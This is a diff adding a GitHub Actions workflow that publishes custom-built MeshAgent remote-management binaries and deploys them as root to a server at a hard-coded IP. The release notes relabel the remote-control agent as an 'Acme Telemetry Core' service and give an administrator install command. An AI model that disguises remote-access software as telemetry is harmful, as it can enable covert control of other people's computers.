@@ -1,0 +1,238 @@
+name: Release Custom MeshAgent Binaries
+
+on:
+  push:
+    tags:
+      - 'v*'
+  workflow_dispatch:
+    inputs:
+      version:
+        description: 'Release version (e.g., v1.0.0)'
+        required: true
+        default: 'v1.0.0'
+      deploy_to_server:
+        description: 'Deploy to MeshCentral server'
+        required: false
+        default: 'false'
+        type: boolean
+
+env:
+  MESHCENTRAL_SERVER: '72.60.233.29'
+  MESHCENTRAL_AGENTS_PATH: '/opt/meshcentral/meshcentral-data/agents'
+
+jobs:
+  create-release:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Checkout repository
+        uses: actions/checkout@v4
+
+      - name: Check for pre-built binaries
+        id: check_binaries
+        run: |
+          if [ -f "meshservice/Release/MeshService64.exe" ] && [ -f "meshservice/Release/MeshService.exe" ]; then
+            echo "binaries_found=true" >> $GITHUB_OUTPUT
+            echo "✅ Found pre-built binaries"
+            ls -lh meshservice/Release/MeshService*.exe
+          else
+            echo "binaries_found=false" >> $GITHUB_OUTPUT
+            echo "❌ Pre-built binaries not found"
+            echo "Please build binaries locally and commit them before creating a release"
+            exit 1
+          fi
+
+      - name: Validate binary branding
+        run: |
+          echo "Validating binary metadata..."
+          # Check file sizes (should be >3MB each)
+          size64=$(stat -c%s "meshservice/Release/MeshService64.exe")
+          size32=$(stat -c%s "meshservice/Release/MeshService.exe")
+
+          if [ "$size64" -lt 3000000 ]; then
+            echo "❌ MeshService64.exe is too small: $size64 bytes"
+            exit 1
+          fi
+
+          if [ "$size32" -lt 3000000 ]; then
+            echo "❌ MeshService.exe is too small: $size32 bytes"
+            exit 1
+          fi
+
+          echo "✅ Binary sizes validated"
+          echo "  MeshService64.exe: $size64 bytes"
+          echo "  MeshService.exe: $size32 bytes"
+
+      - name: Calculate checksums
+        id: checksums
+        run: |
+          cd meshservice/Release
+          md5sum MeshService64.exe MeshService.exe > checksums.md5
+          sha256sum MeshService64.exe MeshService.exe > checksums.sha256
+
+          echo "MD5 Checksums:"
+          cat checksums.md5
+          echo ""
+          echo "SHA256 Checksums:"
+          cat checksums.sha256
+
+      - name: Create release notes
+        run: |
+          cat > release_notes.md << 'EOF'
+          ## 🎯 Custom MeshAgent Binaries - Acme Telemetry Core
+
+          ### 📦 What's Included
+
+          This release contains custom-branded MeshAgent binaries:
+
+          - **MeshService64.exe** - 64-bit Windows agent (x64)
+          - **MeshService.exe** - 32-bit Windows agent (x86)
+
+          ### 🏷️ Branding Configuration
+
+          - **Company**: Acme Corp
+          - **Service Name**: AcmeTelemetryCore
+          - **Display Name**: Acme Telemetry Core Service
+          - **Product**: Acme Telemetry Core
+          - **Server**: wss://72.60.233.29:443/agent.ashx
+          - **Version**: 1.0.0.0
+
+          ### 📥 Installation
+
+          #### Option 1: Direct Install
+          ```powershell
+          # Download the appropriate binary
+          # Run as Administrator
+          .\MeshService64.exe -install
+
+          # Verify installation
+          Get-Service "AcmeTelemetryCore"
+          ```
+
+          #### Option 2: Deploy via MeshCentral Server
+          1. Download from: https://72.60.233.29 or https://high.support
+          2. Login to MeshCentral
+          3. Go to "My Server" → "Installation" → "Windows"
+          4. The agent will have Acme branding
+
+          ### 🔧 Technical Details
+
+          - **Build Date**: $(date -u +"%Y-%m-%d %H:%M:%S UTC")
+          - **Commit**: ${{ github.sha }}
+          - **Branch**: ${{ github.ref_name }}
+          - **Built On**: Windows with Visual Studio 2022
+          - **Platform Toolset**: v143
+
+          ### 📝 Files
+
+          EOF
+
+          # Add file information
+          cd meshservice/Release
+          for file in MeshService64.exe MeshService.exe; do
+            size=$(stat -c%s "$file")
+            size_mb=$(echo "scale=2; $size/1024/1024" | bc)
+            md5=$(md5sum "$file" | cut -d' ' -f1)
+            sha256=$(sha256sum "$file" | cut -d' ' -f1)
+
+            echo "#### $file" >> ../../release_notes.md
+            echo "- **Size**: ${size_mb} MB" >> ../../release_notes.md
+            echo "- **MD5**: \`$md5\`" >> ../../release_notes.md
+            echo "- **SHA256**: \`$sha256\`" >> ../../release_notes.md
+            echo "" >> ../../release_notes.md
+          done
+
+          cd ../..
+
+          cat >> release_notes.md << 'EOF'
+
+          ### 🔐 Security Notes
+
+          - Binaries are code-signed by MeshCentral server during deployment
+          - Use HTTPS for all downloads
+          - Verify checksums before installation
+
+          ### 📚 Documentation
+
+          - [Deployment Guide](https://github.com/hira-edu/MeshAgent/blob/master/DEPLOYMENT_GUIDE.md)
+          - [Build Plan](https://github.com/hira-edu/MeshAgent/blob/master/docs/MESHAGENT_CUSTOM_BUILD_PLAN.md)
+
+          ### 🆘 Support
+
+          For issues or questions:
+          1. Check GitHub Actions logs
+          2. Review MeshCentral server logs: `journalctl -u meshcentral -f`
+          3. Check Nginx logs: `tail -f /var/log/nginx/error.log`
+
+          ---
+
+          🤖 Generated with [Claude Code](https://claude.com/claude-code)
+          EOF
+
+      - name: Create GitHub Release
+        uses: softprops/action-gh-release@v1
+        with:
+          files: |
+            meshservice/Release/MeshService64.exe
+            meshservice/Release/MeshService.exe
+            meshservice/Release/checksums.md5
+            meshservice/Release/checksums.sha256
+          body_path: release_notes.md
+          draft: false
+          prerelease: false
+          tag_name: ${{ github.event.inputs.version || github.ref_name }}
+        env:
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+
+  deploy-to-server:
+    needs: create-release
+    runs-on: ubuntu-latest
+    if: |
+      (github.event_name == 'workflow_dispatch' && github.event.inputs.deploy_to_server == 'true') ||
+      (github.event_name == 'push' && startsWith(github.ref, 'refs/tags/v'))
+
+    steps:
+      - name: Checkout repository
+        uses: actions/checkout@v4
+
+      - name: Setup SSH
+        if: ${{ secrets.SSH_PRIVATE_KEY != '' }}
+        run: |
+          mkdir -p ~/.ssh
+          echo "${{ secrets.SSH_PRIVATE_KEY }}" > ~/.ssh/id_rsa
+          chmod 600 ~/.ssh/id_rsa
+          ssh-keyscan -H ${{ env.MESHCENTRAL_SERVER }} >> ~/.ssh/known_hosts
+
+      - name: Deploy to MeshCentral server
+        if: ${{ secrets.SSH_PRIVATE_KEY != '' }}
+        run: |
+          echo "🚀 Deploying to MeshCentral server..."
+
+          # Upload binaries
+          scp meshservice/Release/MeshService64.exe root@${{ env.MESHCENTRAL_SERVER }}:${{ env.MESHCENTRAL_AGENTS_PATH }}/
+          scp meshservice/Release/MeshService.exe root@${{ env.MESHCENTRAL_SERVER }}:${{ env.MESHCENTRAL_AGENTS_PATH }}/
+
+          # Verify upload
+          ssh root@${{ env.MESHCENTRAL_SERVER }} "ls -lh ${{ env.MESHCENTRAL_AGENTS_PATH }}/MeshService*.exe"
+
+          # Restart MeshCentral
+          ssh root@${{ env.MESHCENTRAL_SERVER }} "systemctl restart meshcentral"
+
+          echo "✅ Deployed successfully to ${{ env.MESHCENTRAL_SERVER }}"
+
+      - name: Verify deployment
+        if: ${{ secrets.SSH_PRIVATE_KEY != '' }}
+        run: |
+          # Wait for service to start
+          sleep 10
+
+          # Check service status
+          ssh root@${{ env.MESHCENTRAL_SERVER }} "systemctl status meshcentral --no-pager | head -20"
+
+          echo "✅ Deployment verified"
+
+      - name: Skip deployment (no SSH key)
+        if: ${{ secrets.SSH_PRIVATE_KEY == '' }}
+        run: |
+          echo "⚠️ Skipping deployment: SSH_PRIVATE_KEY secret not configured"
+          echo "To enable automatic deployment, add SSH_PRIVATE_KEY to repository secrets"
